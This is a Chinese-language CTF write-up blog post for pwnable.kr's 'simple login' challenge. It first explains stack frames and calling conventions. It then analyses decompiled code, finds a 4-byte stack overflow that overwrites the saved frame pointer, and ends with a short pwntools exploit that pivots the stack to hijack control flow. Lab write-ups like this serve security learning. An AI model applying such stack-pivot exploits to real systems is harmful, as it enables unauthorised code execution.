---
layout: post
title: pwnable.kr - simple login
date: 2023-03-22 11:55 +0800
categories: [ctf, pwn]
tag: [pwnable.kr, stack]
---
# 栈的相关知识
## 栈帧指针寄存器 
> 为了访问函数局部变量，必须能定位每个变量。局部变量相对于堆栈指针ESP的位置在进入函数时就已确定，理论上变量可用ESP加偏移量来引用，但ESP会在函数执行期随变量的压栈和出栈而变动。尽管某些情况下编译器能跟踪栈中的变量操作以修正偏移量，但要引入可观的管理开销。而且在有些机器上(如Intel处理器)，用ESP加偏移量来访问一个变量需要多条指令才能实现。
{: .prompt-tip }
> 因此，许多编译器使用帧指针寄存器(FP,Frame Pointer)记录栈帧基地址。局部变量和函数参数都可通过帧指针引用，因为它们到FP的距离不会受到压栈和出栈操作的影响。有些资料将帧指针称作局部基指针(LB, local base pointer)。
{: .prompt-info }
> 在Intel CPU中，寄存器BP(EBP)用作帧指针。在Motorola CPU中，除A7(堆栈指针SP)外的任何地址寄存器都可用作FP。当堆栈向下(低地址)增长时，以FP地址为基准，函数参数的偏移量是正值，而局部变量的偏移量是负值。
{: .prompt-tip }

## 调用约定
### 主调函数保存寄存器(caller-saved registers)
寄存器：`eax`,`edx`,`ecx`

约定：若主调函数希望保持这些寄存器的值，则必须在调用前显式地将其保存在栈中，此时被调函数可以覆盖这些寄存器，而不会破坏主调函数所需的数据

### 被调函数保存寄存器(callee-saved registers)
寄存器：`ebx`,`esi`,`edi`

约定：被调函数在覆盖这些寄存器的值时，必须先将寄存器原值压入栈中保存起来，并在函数返回前从栈中恢复其原值，因为主调函数可能也在使用这些寄存器。此外，被调函数必须保持寄存器`ebp`和`esp`，并在函数返回后将其恢复到调用前的值，亦即必须恢复主调函数的栈帧。

## 栈帧
* 每个未完成运行的函数占用一个独立的连续区域，称作栈帧(Stack Frame)
* 栈帧是栈的逻辑片段
* 当调用函数时逻辑栈帧被压入栈，当函数返回时逻辑栈帧被从栈中弹出
* 栈帧存放着函数参数，局部变量及恢复前一栈帧所需要的数据等
* 栈帧的边界

  * 栈帧基地址指针(EBP),指向当前栈帧底部(高地址),在当前栈帧内位置固定
  * 栈帧栈顶指针(ESP),指向当前栈帧顶部(低地址)，当程序执行时ESP会随着数据的入栈和出栈而移动。因此函数中对大部分数据的访问都基于EBP进行。

# 题目详解
## checksec
```bash
➜  work checksec login
[*] '/root/work/login'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

## 寻找漏洞点
### main函数
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int plaintext; // [esp+18h] [ebp-28h] BYREF
  char buf[30]; // [esp+1Eh] [ebp-22h] BYREF
  unsigned int len; // [esp+3Ch] [ebp-4h]

  memset(buf, 0, sizeof(buf));
  setvbuf(stderr_0, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  printf_0("Authenticate : ");
  _isoc99_scanf("%30s", buf);
  memset(&input, 0, 0xCu);
  plaintext = 0;
  len = Base64Decode(buf, &plaintext);
  if ( len > 0xC )
  {
    puts("Wrong Length");
  }
  else
  {
    memcpy(&input, plaintext, len);
    if ( auth(len) == 1 )
      correct();
  }
  return 0;
}
```
### auth函数
```c
_BOOL4 __cdecl auth(unsigned int len)
{
  char v2[8]; // [esp+14h] [ebp-14h] BYREF
  char *s2; // [esp+1Ch] [ebp-Ch]
  char buf[8]; // [esp+20h] [ebp-8h] BYREF

  memcpy(buf, input, len);
  s2 = (char *)calc_md5((int)v2, 12);
  printf_0("hash : %s\n");
  return strcmp("f87cd601aa7fedca99018a8be88eda34", s2) == 0;
}
```
注意到这里的`memcpy`操作，input的长度最大为16，len最大为12，buf只有8个字节，因此可以制造4个字节的栈溢出

接下来我们来看清楚栈布局。

```
+----------+-----------+------+
| addr     | name      | size |
+----------+-----------+------+
| ebp-0x28 |           |      |
| ebp-0x14 |           | 8    |
| ebp-0x0c | md5       | 4    |
| ebp-0x08 | buf       | 8    |
| ebp      | saved ebp | 4    |
| ebp+0x04 | retaddr   | 4    |
| ebp+0x08 | arg0      | 4    |
+----------+-----------+------+
```

因此我们可以选择覆盖`saved ebp`，这样的话就修改了main函数的ebp，将栈的基地址修改了，该技术也被称作栈迁移技术。
现在我们拥有将栈迁移到任意位置的能力，我们可以继续利用main函数结尾中的如下代码片段：
```
leave <==> mov esp, ebp
           pop ebp

ret   <==> pop eip
```

我们可控制的栈:
```
+---------+-------------+
| addr    | name        |
+---------+-------------+
| buf + 0 | AAAA        |  pop ebp
| buf + 4 | system addr |  pop eip
| buf + 8 | buf addr    |
+---------+-------------+
```
这样的话就可以控制PC跳转到system函数了，exp如下
```python
import base64
from pwn import *
hijacked_addr = 0x08049284
bss_input = 0x0811EB40
payload = base64.b64encode(b'ABCD' + p32(hijacked_addr) + p32(bss_input) ).decode()
print(payload)
```


[1][栈帧结构](https://www.cnblogs.com/clover-toeic/p/3755401.html)